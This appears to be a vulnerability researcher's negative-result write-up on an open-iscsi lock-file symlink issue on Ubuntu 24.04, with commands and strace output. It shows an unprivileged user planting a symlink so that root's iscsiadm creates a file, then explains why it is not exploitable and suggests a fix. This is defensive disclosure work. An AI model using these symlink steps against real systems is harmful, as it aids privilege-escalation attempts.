# Negative: open-iscsi `/run/lock/iscsi` root file creation primitive

Status: no validated LPE.

Target: `ubuntu24-server-lpe-target`, Ubuntu 24.04.4 LTS. Attacker: `uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)`.

## Default proof

Package and unit state:

```text
open-iscsi       2.1.9-3ubuntu5.4
libopeniscsiusr  2.1.9-3ubuntu5.4

iscsid.socket       enabled and active
iscsid.service      disabled, socket-activated, root
open-iscsi.service  enabled, but inactive because both default conditions are unmet:
                    ConditionDirectoryNotEmpty=|/etc/iscsi/nodes
                    ConditionDirectoryNotEmpty=|/sys/class/iscsi_session
```

Relevant unit paths:

```text
/usr/lib/systemd/system/iscsid.service:15 ExecStartPre=/usr/lib/open-iscsi/startup-checks.sh
/usr/lib/systemd/system/iscsid.service:16 ExecStart=/usr/sbin/iscsid
/usr/lib/systemd/system/open-iscsi.service:23 ExecStart=/usr/sbin/iscsiadm -m node --loginall=automatic
```

Default `/run/lock` is sticky world-writable:

```text
drwxrwxrwt root:root /run/lock
```

## Primitive

As a normal user, running `iscsiadm` creates an attacker-owned lock directory and lock file under `/run/lock`:

```sh
rm -rf /run/lock/iscsi
runuser -u attacker -- strace -ff -o /home/attacker/iscsiadm-lock-trace/iscsiadm \
  -s 200 -e trace=file,openat,linkat,unlinkat /usr/sbin/iscsiadm -m node
```

Observed file operations:

```text
faccessat(AT_FDCWD, "/run/lock/iscsi", F_OK) = -1 ENOENT
mkdirat(AT_FDCWD, "/run/lock/iscsi", 0770) = 0
openat(AT_FDCWD, "/run/lock/iscsi/lock", O_RDWR|O_CREAT, 0666) = 3
linkat(AT_FDCWD, "/run/lock/iscsi/lock", AT_FDCWD, "/run/lock/iscsi/lock.write", 0) = 0
```

Result:

```text
drwx------ attacker:attacker /run/lock/iscsi
-rw------- attacker:attacker /run/lock/iscsi/lock
```

If root later runs `iscsiadm`, the same lock path is followed. With an attacker-controlled symlink:

```sh
rm -f /tmp/iscsi-root-created
rm -rf /run/lock/iscsi
runuser -u attacker -- mkdir -m 700 /run/lock/iscsi
runuser -u attacker -- ln -s /tmp/iscsi-root-created /run/lock/iscsi/lock
strace -o /tmp/iscsi-root-iscsiadm.trace -s 200 -e trace=openat,linkat,write,fcntl \
  /usr/sbin/iscsiadm -m node || true
```

Root follows the symlink and creates the target:

```text
openat(AT_FDCWD, "/run/lock/iscsi/lock", O_RDWR|O_CREAT, 0666) = 3
linkat(AT_FDCWD, "/run/lock/iscsi/lock", AT_FDCWD, "/run/lock/iscsi/lock.write", 0) = 0

-rw------- root:root 0 /tmp/iscsi-root-created
```

## Why this is not a finding

This is only an empty root-owned file creation primitive in the tested default state.

The normal user can trigger their own `iscsiadm`, but that runs as uid 1001. The default root service that runs `iscsiadm` is `open-iscsi.service`, and it is condition-gated off because `/etc/iscsi/nodes` and `/sys/class/iscsi_session` are absent by default and not writable/creatable by uid 1001. Triggering `iscsid.socket` starts root `iscsid`, not root `iscsiadm`; `iscsid` did not touch `/run/lock/iscsi` before failing in this Docker kernel with `NETLINK_ISCSI` unsupported.

Even when root `iscsiadm` is simulated, the observed operation creates an empty file and does not write attacker-controlled content. I found no default path to turn this into root command execution, sudoers injection, loader configuration, or another root privilege increase.

## Cleanup

```sh
rm -rf /run/lock/iscsi
rm -rf /home/attacker/iscsiadm-lock-trace
rm -f /tmp/iscsi-root-created /tmp/iscsi-root-iscsiadm.trace \
  /tmp/iscsi-root-iscsiadm.out /tmp/iscsi-root-iscsiadm.err
systemctl reset-failed iscsid.service iscsid.socket
systemctl start iscsid.socket
```

## Why scanners may miss it

The primitive spans a sticky runtime directory, a user-created lock directory, and a later root invocation of the same helper. Simple permission scanners usually report `/run/lock` as expected sticky state and do not model cross-user lock-file reuse or whether a root service can be induced to run the same binary in default conditions.

## Suggested fix

Have open-iscsi create `/run/lock/iscsi` through tmpfiles as `root:root 0700`, or make `iscsiadm` validate ownership and type of `/run/lock/iscsi` and `lock` before opening. Use `openat2()` with no symlink traversal or create locks under a root-owned runtime directory.
